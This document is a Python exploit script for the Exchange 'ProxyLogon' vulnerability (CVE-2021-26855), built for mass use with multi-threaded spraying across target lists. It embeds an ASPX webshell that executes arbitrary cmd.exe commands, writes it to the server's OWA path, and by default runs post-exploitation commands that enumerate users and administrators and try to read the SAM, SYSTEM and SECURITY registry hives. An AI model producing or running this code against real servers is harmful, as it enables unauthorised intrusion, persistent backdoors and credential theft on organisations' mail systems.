#!/usr/bin/env python3
"""
proxylogon_poc.py (Enhanced)

Powerful PoC for CVE-2021-26855 (Exchange “ProxyLogon”).
- Supports mass exploitation (multiple targets)
- Supports custom webshell payloads and arbitrary command execution
- Supports multi-threaded spraying and post-exploitation enumeration
- Robust error handling and logging

Usage:
    python3 proxylogon_poc.py --target <exchange_url>[,<url2>,...] [--targets_file targets.txt] [--webshell WEB_SHELL] [--cmd CMD] [--spray N] [--delay SECS]

Example:
    python3 proxylogon_poc.py --target https://exchange1.local,https://exchange2.local --cmd "whoami" --spray 5 --delay 1

"""

import sys
import argparse
import requests
import re
import threading
import time
from urllib.parse import urljoin
import logging
import os

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("proxylogon_poc")

DEFAULT_WEBSHELL = """
<%@ Page Language="C#"%>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e) {
        string cmd = Request.QueryString["cmd"];
        if (cmd != null) {
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            Process p = Process.Start(psi); 
            System.IO.StreamReader sr = p.StandardOutput;
            Response.Write("<pre>" + sr.ReadToEnd() + "</pre>");
        }
    }
</script>
"""

def parse_args():
    parser = argparse.ArgumentParser(description="CVE-2021-26855 ProxyLogon PoC (Enhanced)")
    parser.add_argument("--target", help="Comma-separated Exchange URLs (e.g. https://mail1,https://mail2)")
    parser.add_argument("--targets_file", help="File with Exchange URLs (one per line)")
    parser.add_argument("--webshell", help="Path to custom webshell .aspx file")
    parser.add_argument("--cmd", help="Command to execute via webshell after exploitation")
    parser.add_argument("--spray", type=int, default=1, help="Number of exploit attempts per target")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay between attempts (seconds)")
    parser.add_argument("--post_cmds", nargs="*", help="List of post-ex commands to run via webshell")
    parser.add_argument("--shell_timeout", type=int, default=15, help="Timeout for each shell command (seconds)")
    return parser.parse_args()

def get_ews_url(target):
    autodiscover_url = urljoin(target, "/autodiscover/autodiscover.json/v1.0")
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json"
    }
    body = {
        "Email": "unvalidated@invalid",
        "AcceptableResponseSchema": "http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"
    }
    try:
        r = requests.post(autodiscover_url, json=body, verify=False, timeout=10)
        location = re.search(r"<EwsUrl>(https?://[^<]+)</EwsUrl>", r.text)
        if location:
            return location.group(1)
    except Exception:
        pass
    return None

def exploit_proxylogon(target, webshell_payload=None, cmd=None, post_cmds=None, shell_timeout=15):
    """
    Enhanced: 
    - Supports arbitrary post-exploitation commands (list or single).
    - Collects all outputs, robust error handling.
    - shell_timeout: timeout for each shell command.
    """
    try:
        s = requests.Session()
        s.verify = False
        s.headers.update({"Cookie": "X-AnonResource=true; X-AnonResource-Backend=localhost"})
        url1 = urljoin(target, "/autodiscover/autodiscover.json/v1.0")
        body = {
            "Email": "admin@localhost",
            "AcceptableResponseSchema": "http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"
        }
        r1 = s.post(url1, json=body, timeout=10)
        if r1.status_code != 200:
            return {"status":"error", "detail":"Autodiscover did not return 200"}

        try:
            legacy_dn = r1.json()["Response"]["User"]["LegacyDN"]
        except Exception:
            return {"status":"error", "detail":"Could not parse LegacyDN"}

        user_guid = legacy_dn.split("/")[-1]
        url_ecp = urljoin(target, f"/ecp/{user_guid}/ExportObjects?Schema=/owa/auth/webshell.aspx%00")
        webshell = webshell_payload if webshell_payload else DEFAULT_WEBSHELL.encode("utf-8")
        multipart = {
            "DestinationPath": (None, ""),
            "Parameter": (None, ""),
            "FileName": ("webshell.aspx", webshell, "application/octet-stream")
        }
        logger.info(f"[*] Writing webshell via {url_ecp}")
        r2 = s.post(url_ecp, files=multipart, timeout=10, allow_redirects=False)
        if r2.status_code not in (201, 302, 200):
            return {"status":"error", "detail":f"Failed to write webshell (HTTP {r2.status_code})"}

        shell_url = urljoin(target, "/owa/auth/webshell.aspx")
        outputs = {}
        # Enhanced: support multiple post-ex commands
        if cmd:
            cmds = [cmd]
        elif post_cmds:
            cmds = post_cmds
        else:
            # Dangerous: run a set of default post-ex commands (expanded)
            cmds = [
                "whoami", "hostname", "ipconfig", "net user", "net localgroup administrators",
                "type C:\\Windows\\win.ini", "type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "dir C:\\", "dir C:\\Users", "dir C:\\Users\\Administrator",
                "type C:\\Windows\\System32\\config\\SAM", "type C:\\Windows\\System32\\config\\SYSTEM",
                "type C:\\Windows\\System32\\config\\SECURITY"
            ]
        for c in cmds:
            shell_url_cmd = f"{shell_url}?cmd={requests.utils.quote(c)}"
            logger.info(f"[*] Executing: {c} via {shell_url_cmd}")
            try:
                r = s.get(shell_url_cmd, timeout=shell_timeout)
                outputs[c] = r.text if r.status_code == 200 else f"HTTP {r.status_code}"
            except Exception as ex:
                outputs[c] = f"ERROR: {ex}"
        return {"status":"ok", "webshell": shell_url, "outputs": outputs}
    except Exception as e:
        logger.error(f"Exploit failed for {target}: {e}")
        return {"status":"error", "detail": str(e)}

def mass_exploit(targets, webshell_payload=None, cmd=None, spray=1, delay=0.0, post_cmds=None, shell_timeout=15):
    """
    Enhanced: 
    - Supports arbitrary post-ex commands (list).
    - shell_timeout: timeout for each shell command.
    """
    results = {}
    lock = threading.Lock()
    def worker(target):
        for i in range(spray):
            res = exploit_proxylogon(
                target,
                webshell_payload=webshell_payload,
                cmd=cmd,
                post_cmds=post_cmds,
                shell_timeout=shell_timeout
            )
            with lock:
                if target not in results:
                    results[target] = []
                results[target].append(res)
            if delay > 0 and i < spray - 1:
                time.sleep(delay)
    threads = []
    for tgt in targets:
        t = threading.Thread(target=worker, args=(tgt,), daemon=True)
        threads.append(t)
        t.start()
    for t in threads:
        t.join(timeout=90)
    return results

def main():
    args = parse_args()
    targets = []
    if args.target:
        targets += [t.strip() for t in args.target.split(",") if t.strip()]
    if args.targets_file:
        with open(args.targets_file, "r") as f:
            targets += [line.strip() for line in f if line.strip()]
    if not targets:
        logger.error("No targets specified.")
        sys.exit(1)
    webshell_payload = None
    if args.webshell and os.path.exists(args.webshell):
        with open(args.webshell, "rb") as f:
            webshell_payload = f.read()
    results = mass_exploit(
        targets,
        webshell_payload=webshell_payload,
        cmd=args.cmd,
        spray=args.spray,
        delay=args.delay,
        post_cmds=args.post_cmds,
        shell_timeout=args.shell_timeout
    )
    for tgt, reslist in results.items():
        print(f"\n[===] Results for {tgt}:")
        for idx, res in enumerate(reslist):
            print(f"  [*] Attempt {idx+1}: {res}")

if __name__ == "__main__":
    main()
